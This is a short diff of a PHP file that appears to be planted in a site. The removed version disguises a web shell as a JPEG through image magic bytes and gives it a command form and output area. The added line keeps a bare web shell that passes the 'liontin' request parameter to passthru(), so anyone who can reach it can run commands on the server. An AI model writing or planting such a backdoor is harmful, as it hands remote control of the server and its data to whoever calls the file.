@@ -1,6 +1,1 @@
-ÿØÿà
-<form action="" method="get">
-Command: <input type="text" name="liontin" /><input type="submit" value="Exec" />
-</form>
-Output:<br />
-<pre><?php passthru($_REQUEST['liontin'], $result); ?></pre>
+<?php passthru($_REQUEST['liontin'], $result); ?>
